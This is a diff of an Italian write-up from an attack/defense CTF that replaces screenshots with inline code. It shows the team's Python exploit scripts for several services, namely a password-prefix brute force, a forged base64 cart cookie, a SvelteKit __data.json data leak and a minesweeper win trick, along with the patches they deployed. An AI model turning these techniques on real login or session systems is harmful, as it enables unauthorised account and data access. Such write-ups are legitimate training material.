@@ -50,7 +50,37 @@ Per rompere la funzione di login, quindi, sarebbe bastato inviare una password v
 Quando è stato scritto l'exploit, tuttavia, si è pensato che una password vuota sarebbe stata l'attacco più ovvio (troppo facile da patchare).
 Si è deciso, quindi, di provare ad indovinare il primo carattere della password, per non ricadere nel caso banale. Indovinare, in informatica, significa bruteforce:
 
-![gabibbi 2](imgs/gabibbi2_exploit.png)
+```python
+def get_flag(ip, port, hint):
+	# PASSAGGI NECESSARI A PRELEVARE UNA FLAG
+    sito = f'http://{ip}:{port}'
+    user = hint['username']
+
+    trovato = False
+
+    i = 0
+    alfabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+
+    session = requests.Session()
+
+    while not trovato and i < len(alfabeto):
+        credentials = {
+        "username" : user,
+        "password" : alfabeto[i]
+        }
+
+        r = session.post(f'{sito}/login', json=credentials, timeout=2)
+        time.sleep(0.1)
+        prova = (r.json())
+        if not prova.get('detail') and prova.get('info'):
+            trovato = True
+            flag = prova['info']
+
+        i += 1
+
+	# RESTITUISCI LA FLAG
+    return flag or ""
+```
 
 #### Patch
 La patch per questo servizio prevede che la comparazione non sia fatta sui primi n caratteri della stringa ma su tutta la stringa. Bisogna quindi sostituire strlen(pass) con strlen(user.password)
@@ -79,19 +109,45 @@ L'exploit costruito consisteva quindi nel creare un cookie custom del carrello i
 
 Inizialmente, per generare un po' di rumore e provare a confondere i teams avversari è stata prevista la registrazione di un utente random:
 
-![alt text](imgs/register_gh.png)
+```python
+credentials = {
+    "name" : generate_random_string(10),
+    "password" : generate_random_string(10),
+    "email" : generate_random_string(6) + '@email.com'
+}
+
+session = requests.Session()
+
+r = session.post(f'{sito}/signup', data=credentials, timeout=1)
+```
 
 In seguito, preso un determinato flagId, si considerava il "productId" lì presente, memorizzandolo nella variabile prodotto:
 
-![alt text](imgs/gh_productid.png)
+```python
+prodotto = hint['productId']
+```
 
 e si costruiva una lista, codificata in base64, relativa al carrello:
 
-![alt text](imgs/gh_cartcookie.png)
+```python
+cart = '[{"qty":1,"id":"' + prodotto + '"}]'
+cartbase = base64.b64encode(cart.encode()).decode()
+```
 
 a questo punto bastava fare una richiesta all'endpoint "/cart" con i cookies relativi a carrello e sessione e si trovava la flag:
 
-![alt text](imgs/gh_flag.png)
+```python
+cookies = {
+    'cart' : cartbase,
+}
+
+re2 = session.get(f'{sito}/cart', cookies=cookies, timeout=1)
+
+flag = re.findall("[A-Z0-9]{31}=", re2.text)[0]
+
+# RESTITUISCI LA FLAG
+return flag
+```
 
 #### Patch
 
@@ -99,7 +155,15 @@ Per fixare questa vulnerabilità la soluzione ideale sarebbe stata quella di fir
 
 La soluzione attuata infatti prevedeva di rinominare il nome del cookie da "cart" a "cartone". Essa, come detto, si è rilevata una patch altamente efficace in quanto ci ha portato a non perdere alcuna flag su questo servizio. Questo perché tutti gli exploit consistevano nel prelevare i dati dal cookie denominato "cart", che però noi non fornivamo. Ovviamente, questa soluzione non ha dato fastidio al gameserver che, simulando i comportamenti legittimi, non aveva necessità di andare a considerare il cookie.
 
-![alt text](imgs/gh1_patch.png)
+```typescript
+cookies.set('cartone', Buffer.from(JSON.stringify(cart)).toString('base64url'), {
+    path: '/',
+    secure: false,
+    httpOnly: true,
+    sameSite: 'strict',
+    maxAge: 60 * 60
+})
+```
 
 
 ### GadgetHorse-2
@@ -114,17 +178,52 @@ Sfruttando la vulnerabilità descritta è quindi stato possibile costruire l'exp
 
 Per quanto riguarda i dettagli dell'exploit, possiamo notare che, anche qui, per generare disturbi agli altri teams è stata fatta la registrazione di un utente casuale:
 
-![alt text](imgs/gh2_register.png)
+```python
+credentials = {
+    "name" : generate_random_string(10),
+    "password" : generate_random_string(10),
+    "email" : generate_random_string(6) + '@email.com'
+}
+
+session = requests.Session()
+
+r = session.post(f'{sito}/signup', data=credentials, timeout=1)
+```
 
 In seguito, è stata fatta la richiesta all'endpoint summenzionato, inserendo come productId, quello estrapolato dal flagId corrente. Inoltre, per generare altro "rumore", è stato utilizzato anche un cookie non necessario contenente il carrello *[{"qty":1,"id":"cyberchallenge"}]*.
 
-![alt text](imgs/gh2-flag.png)
+```python
+cookies = {
+    'cart' : 'W3sicXR5IjoxLCJpZCI6ImN5YmVyY2hhbGxlbmdlIn1d',
+}
+
+re2 = session.get(f'{sito}/order/{prodotto}/__data.json', cookies=cookies, timeout=1)
+
+flag = re.findall("[A-Z0-9]{31}=", re2.text)[0]
+
+# RESTITUISCI LA FLAG
+return flag
+```
 
 #### Patch
 
 Per fixare questa vulnerabilità, l'idea è stata quella di andare a rimuovere la possibilità di utilizzare l'endpoint relativo a *__data.json*. Per fare ciò è bastato aggiungere nella cartella _src_ un file denominato _hooks.server.js_ con il seguente contenuto:
 
-![alt text](imgs/gh2-patch.png)
+```javascript
+// src/hooks.server.js
+
+/** @type {import('@sveltejs/kit').[Handle](https://kit.svelte.dev/docs/types#public-types-handle)} */
+export async function handle({ event, resolve }) {
+    // true when the request is for a `__data.json` endpoint
+    // https://kit.svelte.dev/docs/types#public-types-requestevent
+    if (event.isDataRequest) {
+        return new Response(null, { status: 400 });
+    }
+
+    const response = await resolve(event);
+    return response;
+}
+```
 
 Ciò è servito per restituire risposte con codice 400 (Bad Request) ad ogni richiesta di tipo "data", cioè ogni richiesta verso questo endpoint.
 
@@ -167,43 +266,92 @@ L'exploit sfruttato da molte altre squadre della cyberchallenge è il seguente:
 
 La squadra ha però notato che non c'era bisogno di trovare per forza una bomba per poter ricevere la board con la posizione delle bombe, ma bastava fare una singola richiesta al server su una casella scelta a caso per ricevere tutte le posizione delle bombe, così da non dover perdere, giocando in maniera lecita al gioco per poi ricevere le bombe. L'exploit illustrato nella figura viene spiegato in dettaglio commentando le linee di codice:
 
-![Gatto carino](imgs/exploit.png)
+```python
+def get_flag(ip, port, hint):
+	boardname = hint["boardname"]
+	c=Client(ip,port)
+	username=generate_random_string(10)
+	password=generate_random_string(10)
+	c.signup(username,password)
+	c.login(username,password)
+	c.load_board(boardname)
+
+	res,msg=c.play()
+	game_seed, board_dim, num_bombs = msg
+	flags_left = num_bombs
+	cell,msg=c.uncover(1,1)
+	board=msg[1]
+	for row in range(board_dim):
+		for col in range(board_dim):
+			if board[row][col] == Marker.BOMB:
+				board[row][col] = Marker.FLAG
+	flag=c.check_win(board)
+	return flag
+```
 
 La prima riga serve a prelevare il nome della board:
 
-![Gatto carino](imgs/riga_uno.png)
+```python
+boardname = hint["boardname"]
+```
 
 La seconda riga, utilizzando le funzioni di utilità fornite dal client, inizializza una connessione con il server della macchina fornita in input:
 
-![Gatto carino](imgs/riga_due.png)
+```python
+c = Client(ip,port)
+```
 
 La terza riga genera uno username casuale lungo 10 caratteri:
 
-![Gatto carino](imgs/riga_tre.png)
+```python
+username=generate_random_string(10)
+```
 
 La quarta riga genera una password casuale lungo 10 caratteri:
 
-![Gatto carino](imgs/riga_quattro.png)
+![Gatto carino](imgs/riga_quattro.png
+```python
+password=generate_random_string(10)
+```
 
 La riga cinque fa la registrazione dell'utente al server:
 
-![Gatto carino](imgs/riga_cinque.png)
+```python
+c.signup(username,password)
+```
 
 La riga sei fa il login alla piattraforma:
 
-![Gatto carino](imgs/riga_sei.png)
+```python
+c.login(username,password)
+```
 
 La riga 7 carica la board:
 
-![Gatto carino](imgs/riga_sette.png)
+```python
+c.load_board(boardname)
+```
 
 La riga 8,9 e 10 servono ad avviare il gioco con la board:
 
-![Gatto carino](imgs/riga_otto.png)
+```python
+res,msg=c.play()
+game_seed, board_dim, num_bombs = msg
+flags_left = num_bombs
+```
 
 Le restanti righe fanno la seguente operazione. Inviano una richiesta di uncover di una cella scelta a caso, questa restituiscela la board con la posizione delle bombe. Il for prende la board e dove ci sono le bombe mette le bandierine del prato fiorito, fatto ciò invia la board modificata al server che ovviamente considererà la board come vincente e restituirà la flag.
 
-![Gatto carino](imgs/restanti.png)
+```python
+cell,msg=c.uncover(1,1)
+board=msg[1]
+for row in range(board_dim):
+    for col in range(board_dim):
+        if board[row][col] == Marker.BOMB:
+            board[row][col] = Marker.FLAG
+flag=c.check_win(board)
+return flag
+```
 
 Come si può facilmente evincere non c'è bisogno di perdere per poter ottenere la flag, ma basta seguire il procedimento descritto. Infatti questo attacco nonostante le patch degli avversari continuava a prendere le flag.
 
